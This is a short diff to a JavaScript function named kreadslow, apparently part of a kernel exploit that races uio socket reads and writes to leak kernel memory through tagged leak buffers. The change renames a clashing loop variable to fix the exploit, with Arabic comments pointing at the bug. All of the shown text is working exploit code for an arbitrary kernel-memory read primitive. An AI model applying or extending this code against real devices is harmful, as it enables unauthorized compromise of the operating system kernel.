@@ -1468,9 +1468,12 @@ function kreadslow(addr, size) {
     if (read32(uio_leak_add) === UIO_IOV_NUM) break;
 
     read(new BigInt(uio_sock_0), tmp, size);
-    for (var i = 0; i < UIO_THREAD_NUM; i++) {
-      read(new BigInt(uio_sock_0), leak_buffers[i], size);
+
+    // ← هنا كانت المشكلة: i مستخدمة قبل كده
+    for (var k = 0; k < UIO_THREAD_NUM; k++) {
+      read(new BigInt(uio_sock_0), leak_buffers[k], size);
     }
+
     wait_uio_writev();
     write(new BigInt(uio_sock_1), tmp, size);
   }
@@ -1511,6 +1514,7 @@ function kreadslow(addr, size) {
   var leak_buffer = new BigInt(0);
   var tag_val = new BigInt(0x41414141, 0x41414141);
 
+  // ← هنا كمان لازم نستخدم متغيّر مختلف
   for (var j = 0; j < UIO_THREAD_NUM; j++) {
     read(new BigInt(uio_sock_0), leak_buffers[j], size);
     var val = read64(leak_buffers[j]);
